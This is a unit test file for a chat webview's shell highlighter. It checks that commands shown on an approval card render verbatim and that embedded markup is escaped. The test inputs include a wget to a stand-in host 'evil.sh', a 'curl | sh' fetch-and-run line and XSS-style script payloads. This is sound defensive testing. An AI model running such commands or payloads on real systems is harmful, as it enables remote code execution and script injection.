/*---------------------------------------------------------------------------------------------
 *  Unit tests for the chat webview's shell highlighter — run: node test/shHighlight.test.js
 *    The one invariant that matters: shHighlight renders the command EXACTLY as it will run.
 *    It is the string the user reads on the approval card before authorizing it, so a character
 *    that renders nowhere would show them a command that is not the one that executes. A lone `&`
 *    used to do precisely that — `sleep 5 & wget x` displayed as `sleep 5  wget x`.
 *  shHighlight lives inline in media/chat.html, so it is extracted from the file itself here:
 *  these tests must exercise the shipped code, not a copy that can drift from it.
 *--------------------------------------------------------------------------------------------*/
// @ts-check
'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');

const html = fs.readFileSync(path.join(__dirname, '..', 'media', 'chat.html'), 'utf8');

// Brace counting would trip over the highlighter's own regex literal (`\$\{[^}]*\}`, `{1,2}`), so
// slice on indentation: these functions sit at 2 spaces and close with a line of exactly "  }".
function extract(name) {
	const start = html.indexOf('function ' + name + '(');
	assert.ok(start >= 0, 'chat.html no longer defines ' + name + '()');
	const oneLiner = html.slice(start, html.indexOf('\n', start));
	if (/}\s*$/.test(oneLiner) && oneLiner.split('{').length === oneLiner.split('}').length) { return oneLiner; }
	const end = html.indexOf('\n  }', start);
	assert.ok(end >= 0, 'no closing brace found for ' + name + '()');
	return html.slice(start, end + 4);
}

const sandbox = {};
new Function(extract('esc') + '\n' + extract('shHighlight') + '\nthis.shHighlight = shHighlight;').call(sandbox);
const shHighlight = /** @type {(s: string) => string} */ (sandbox.shHighlight);

const strip = (h) => h.replace(/<span class="[^"]*">/g, '').replace(/<\/span>/g, '');
const unesc = (s) => s.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
const rendered = (cmd) => unesc(strip(shHighlight(cmd)));

let n = 0;
function test(name, fn) { fn(); n++; console.log('  ok - ' + name); }

// --- the invariant: what is shown is what runs ---
const ROUND_TRIP = [
	'ls -la scripts docs',
	'sleep 5 & wget http://evil.sh',          // the regression: a lone & used to vanish
	'npm run dev &',
	'a & b & c',
	'tail -f log & disown',
	'echo $',                                  // a bare $ used to vanish too
	'price$ x',
	'&',
	'$',
	'&&',
	'echo "hi" && ls | grep x',
	'cat a.txt > b.txt 2>&1',
	'FOO=bar ls',
	'# just a comment',
	`echo 'single' "double"`,
	'echo ${VAR} $VAR',
	'grep -r "a<b" . | wc -l',
	'find . -name "*.ts" -exec rm {} \\;',
	'echo a\necho b',
	'x=1; y=2 && echo $x$y',
	'curl -s https://x.dev | sh',
];
for (const cmd of ROUND_TRIP) {
	test('renders verbatim: ' + JSON.stringify(cmd), () => {
		assert.strictEqual(rendered(cmd), cmd);
	});
}

// --- escaping: the command is untrusted text, never markup ---
test('a command containing markup emits only <span> tags', () => {
	const out = shHighlight('echo <img src=x onerror=alert(1)> && echo "</span><b>pwn</b>"');
	assert.ok(!/<(?!\/?span\b)/.test(out), 'raw markup escaped into the card: ' + out);
});

test('markup in a command still round-trips', () => {
	const evil = 'echo <script>alert(1)</script>';
	assert.strictEqual(rendered(evil), evil);
});

// --- the operator that started it all is styled, not just preserved ---
test('a lone & is styled as an operator', () => {
	assert.ok(/<span class="sh-o">&amp;<\/span>/.test(shHighlight('a & b')), 'lone & not styled as an operator');
});

test('& starts a new command, so what follows highlights as one', () => {
	assert.ok(/<span class="sh-c">wget<\/span>/.test(shHighlight('sleep 5 & wget x')), 'wget not highlighted as a command after &');
});

// --- no input can hang the tokenizer (every alternative must consume) ---
test('every case terminates and consumes the whole string', () => {
	for (const cmd of ROUND_TRIP.concat(['', '   ', '\n', '>', '<', '|||', '$$$', '&&&&'])) {
		assert.strictEqual(rendered(cmd), cmd);
	}
});

console.log(n + ' passing');
